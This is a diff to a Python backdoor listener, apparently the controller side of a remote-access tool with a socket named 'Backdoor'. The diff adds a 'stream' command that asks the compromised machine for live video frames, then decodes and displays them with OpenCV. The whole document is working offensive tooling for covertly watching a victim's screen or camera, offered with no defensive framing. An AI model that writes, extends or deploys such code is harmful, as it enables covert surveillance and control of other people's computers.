@@ -6,6 +6,9 @@ import base64
 import argparse
 import time
 import Banner
+import cv2
+import numpy as np
+import time
 
 class StageLisner:
     def __init__(self):
@@ -60,7 +63,29 @@ class StageLisner:
                     except FileNotFoundError:
                         Backdoor.sendall('\n'.encode(('latin-1')))
                         print(str(Data)+InPutCommand.split()[-1],' No such file or directory\n',end='', flush=True)
-
+                elif 'stream' in InPutCommand:
+                    def receive_frames():
+                        Backdoor.sendall(InPutCommand.encode(('latin-1')))
+                        Backdoor.sendall('\n'.encode(('latin-1')))
+                        print(Data,end='', flush=True)
+                        try:
+                            while True:
+                                frame_length = Backdoor.recv(16)
+                                if not frame_length:
+                                    break    
+                                frame_length = int(frame_length.strip())
+                                frame_data = b''
+                                while len(frame_data) < frame_length:
+                                    remaining_length = frame_length - len(frame_data)
+                                    frame_data += Backdoor.recv(remaining_length)
+                                frame_array = np.frombuffer(frame_data, dtype=np.uint8)
+                                frame = cv2.imdecode(frame_array, cv2.IMREAD_COLOR)
+                                cv2.imshow('Received Frame', frame)
+                                if cv2.waitKey(1) & 0xFF == ord('q'):
+                                    break
+                        finally:
+                            cv2.destroyAllWindows()        
+                    receive_frames()
                 else:  
                     Backdoor.sendall(bytes(InPutCommand.encode(('latin-1'))))
                     Data = str(Backdoor.recv(4096).decode('latin-1'))
